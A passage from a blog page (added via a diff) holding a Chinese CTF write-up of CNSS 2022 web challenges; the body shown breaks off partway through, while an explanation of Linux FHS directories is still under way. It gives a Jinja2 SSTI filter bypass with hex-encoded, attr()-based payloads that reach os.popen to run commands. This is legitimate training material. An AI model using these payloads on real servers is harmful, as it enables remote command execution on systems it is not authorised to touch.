@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[Hard] Walk Through My Intranet - 1SSTI1 pattern &#x3D; re.compile(r&amp;#x27;os\[]_self\+-\*class&quot;\.&amp;#x27;, re.I  re.M)  题目给的url过滤信息，分为几类bypass os ，class ，self ，__ 可以进行编码绕过 class&#x3D;&#x3D;\x5f\x5f\x63\x6c\x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CNSS 2022 招新writeup(web)部分题目">
+<meta property="og:url" content="http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="[Hard] Walk Through My Intranet - 1SSTI1 pattern &#x3D; re.compile(r&amp;#x27;os\[]_self\+-\*class&quot;\.&amp;#x27;, re.I  re.M)  题目给的url过滤信息，分为几类bypass os ，class ，self ，__ 可以进行编码绕过 class&#x3D;&#x3D;\x5f\x5f\x63\x6c\x">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1-1024x719.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/f46efe060b8444df05d6aee5f2a9c87a.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6b5a90d895a54753b79e70121a3f53c3.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/bb49dd7a23e3425e9c42b257856edbd1-1024x363.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212020796.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212216521.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320532282.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320602395.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320694308.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602132307452-8926922491.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602133612437-163441181.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221022110413532-1024x394.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20200415221922550.png">
+<meta property="article:published_time" content="2023-05-14T07:28:10.000Z">
+<meta property="article:modified_time" content="2023-12-21T19:43:35.025Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1-1024x719.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CNSS 2022 招新writeup(web)部分题目</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/05/14/sql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/05/14/%E7%83%A7/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&text=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&is_video=false&description=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CNSS 2022 招新writeup(web)部分题目&body=Check out this article: http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&name=CNSS 2022 招新writeup(web)部分题目&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&t=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hard-Walk-Through-My-Intranet-1"><span class="toc-number">1.</span> <span class="toc-text">[Hard] Walk Through My Intranet - 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">1.1.</span> <span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">linux敏感目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">linux常见命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">查看当前用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bip%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">查看ip等信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%BD%93%E5%89%8D%E4%BD%8D%E7%BD%AE%E8%B7%AF%E5%BE%84"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">显示当前位置路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#find"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%EF%BC%88-%EF%BC%89"><span class="toc-number">1.3.0.5.</span> <span class="toc-text">系统信息（*）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh"><span class="toc-number">1.4.</span> <span class="toc-text">ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.</span> <span class="toc-text">公钥登录</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.0.1.</span> <span class="toc-text">5.远程登录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.5.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.5.0.0.1.</span> <span class="toc-text">netcat反弹</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.5.0.0.2.</span> <span class="toc-text">利用Bash反弹shell</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-CNSS-Proxy"><span class="toc-number">2.</span> <span class="toc-text">[Mid] CNSS Proxy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-directory"><span class="toc-number">2.1.</span> <span class="toc-text">proc directory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">各种目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-number">2.1.3.</span> <span class="toc-text">注意：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">2.2.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">2.2.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.2.</span> <span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98"><span class="toc-number">2.2.4.</span> <span class="toc-text">这个题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pycdc%EF%BC%88re%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">pycdc（re）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cython"><span class="toc-number">2.4.</span> <span class="toc-text">cython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E6%A1%86%E6%9E%B6"><span class="toc-number">2.5.</span> <span class="toc-text">flask框架</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-CNSS-Database"><span class="toc-number">3.</span> <span class="toc-text">[Mid] CNSS Database</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Prepared-Statement"><span class="toc-number">3.0.1.</span> <span class="toc-text">Prepared Statement</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">预编译语句</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.0.2.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pdo%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-number">3.0.3.</span> <span class="toc-text">pdo预处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-ezpad"><span class="toc-number">4.</span> <span class="toc-text">[Mid] ezpad</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4"><span class="toc-number">4.1.</span> <span class="toc-text">脚本爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intval%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">intval绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">hash长度扩展攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hash%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86"><span class="toc-number">4.3.1.</span> <span class="toc-text">hash加密原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="toc-number">4.3.2.</span> <span class="toc-text">MD5拓展攻击演示</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-Pesudo2"><span class="toc-number">5.</span> <span class="toc-text">[Mid] Pesudo2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-Filter%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.0.1.</span> <span class="toc-text">PHP Filter伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-number">5.0.2.</span> <span class="toc-text">伪随机数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-Best-Language"><span class="toc-number">6.</span> <span class="toc-text">[Mid] Best Language</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">6.1.</span> <span class="toc-text">PHP代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.1.1.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">为什么反序列化？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">魔术方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar"><span class="toc-number">6.2.</span> <span class="toc-text">phar</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.2.1.</span> <span class="toc-text">phar伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.2.2.</span> <span class="toc-text">phar反序列化</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CNSS 2022 招新writeup(web)部分题目
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-14T07:28:10.000Z" class="dt-published" itemprop="datePublished">2023-05-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Hard-Walk-Through-My-Intranet-1"><a href="#Hard-Walk-Through-My-Intranet-1" class="headerlink" title="[Hard] Walk Through My Intranet - 1"></a>[Hard] Walk Through My Intranet - 1</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> pattern = re.compile(r&#x27;os\[]_self\+-\*class&quot;\.&#x27;, re.I  re.M)</span><br></pre></td></tr></table></figure>
+
+<p>题目给的url过滤信息，分为几类bypass</p>
+<p>os ，class ，self ，__ 可以进行编码绕过 <strong>class</strong>=&#x3D;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> \x+ASCII值 =》对应值（只要数据被引号包裹，就能作为字符串一样被处理，base64,ascii，字符串凭借，倒置等）</span><br></pre></td></tr></table></figure>
+
+<p>[ ] 和 . 是进行进入目录子类的，用 attr(‘ ‘) 一次性都过滤掉</p>
+<p>其他的都用不上，原始payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> &#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__()[&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;](300).__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把’ ‘里的敏感东西用ASCII编码过滤掉。[ ]就用attr换掉</p>
+<p>最后一个双引号里面套单引号就可以改成外面单引号里面双引号，然后里面又是被当做字符串的那种，就可以ASCII编码了。</p>
+<p>最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> &#123;&#123;&#x27;&#x27;attr(&#x27;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fmro\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(1)attr(&#x27;\x5f\x5fsub\x63\x6c\x61\x73\x73es\x5f\x5f&#x27;)()attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(300)attr(&#x27;\x5f\x5finit\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;eval&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f(\x22\x6F\x73\x22)\x2epopen(\x22ls\x22)\x2eread()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ls的地方就是能够输入命令有漏洞的地方。</p>
+<h3 id="linux敏感目录"><a href="#linux敏感目录" class="headerlink" title="linux敏感目录"></a>linux敏感目录</h3><p>进入linux目录之后开始寻找敏感目录：</p>
+<p>这些又是基于<strong>FHS</strong>（Filesystem Hierarchy Standard ）机构</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1-1024x719.png" style="zoom:50%;" />
+
+<p><strong>FHS认为根目录(&#x2F;)下应该包含如下子目录</strong></p>
+<p>目录</p>
+<p>应放置档案内容</p>
+<p>&#x2F;bin</p>
+<p>系统有很多放置执行档的目录，但&#x2F;bin比较特殊。因为&#x2F;bin放置的是在单人维护模式下还能够被操作的<strong>指令</strong>。在&#x2F;bin底下的指令可以被<strong>root与一般帐号所使用</strong>，主要有：cat,chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。</p>
+<p>&#x2F;boot</p>
+<p>主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在&#x2F;boot&#x2F;grub&#x2F;这个目录。</p>
+<p>&#x2F;dev</p>
+<p>（device）在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有&#x2F;dev&#x2F;null, &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;tty , &#x2F;dev&#x2F;lp_, &#x2F; dev&#x2F;hd_, &#x2F;dev&#x2F;sd*等等</p>
+<p>&#x2F;etc</p>
+<p>系统主要的<strong>设定档</strong>几乎都放置在这个目录内，例如<strong>人员的帐号密码档、各种服务的启始档</strong>等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有：&#x2F;etc&#x2F;inittab, &#x2F;etc&#x2F;init.d&#x2F;, &#x2F;etc&#x2F;modprobe.conf, &#x2F;etc&#x2F;X11&#x2F;, &#x2F;etc&#x2F;fstab, &#x2F;etc&#x2F;sysconfig&#x2F;等等。 另外，其下重要的目录有：&#x2F;etc&#x2F;init.d&#x2F; ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话： &#x2F;etc&#x2F;init.d&#x2F;iptables start、&#x2F;etc&#x2F;init.d&#x2F; iptables stop &#x2F;etc&#x2F;xinetd.d&#x2F; ：这就是所谓的super daemon管理的各项服务的设定档目录。 &#x2F;etc&#x2F;X11&#x2F; ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。（配置信息）</p>
+<p>&#x2F;home</p>
+<p>这是系统预设的使用者家目录(home directory)。 在你<strong>新增一个一般使用者帐号时，预设的使用者家目录都会规范</strong>到这里来。比较重要的是，家目录有两种代号： <strong>~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录。</strong></p>
+<p>&#x2F;lib</p>
+<p>系统的函式库非常的多，而&#x2F;lib放置的则是在<strong>开机时会用到的函式库</strong>，以及在&#x2F;bin或&#x2F;sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？妳可以将他想成是外挂，某些指令必须要有这些外挂才能够顺利完成程式的执行之意。 尤其重要的是&#x2F;lib&#x2F;modules&#x2F;这个目录，因为该目录会放置核心相关的模组(驱动程式)。</p>
+<p>&#x2F;media</p>
+<p>media是媒体的英文，顾名思义，这个&#x2F;media底下放置的就是<strong>可移除的装置</strong>。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：&#x2F;media&#x2F;floppy, &#x2F;media&#x2F;cdrom等等。</p>
+<p>&#x2F;mnt</p>
+<p>如果妳想要<strong>暂时挂载某些额外的装置</strong>，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与&#x2F;media相同啦。 只是有了&#x2F;media之后，这个目录就用来暂时挂载用了。</p>
+<p>&#x2F;opt</p>
+<p>这个是给<strong>第三方协力软体</strong>放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在&#x2F;usr&#x2F;local目录下。</p>
+<p>&#x2F;root</p>
+<p>系统管理员(<strong>root)的家目录</strong>。 之所以放在这里，是因为<strong>如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录</strong>，所以我们会希望root的家目录与根目录放置在同一个分区中。</p>
+<p>&#x2F;sbin</p>
+<p>Linux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来设定系统，其他使用者最多只能用来查询而已。放在&#x2F;sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到&#x2F;usr&#x2F;sbin&#x2F;当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。</p>
+<p>&#x2F;srv</p>
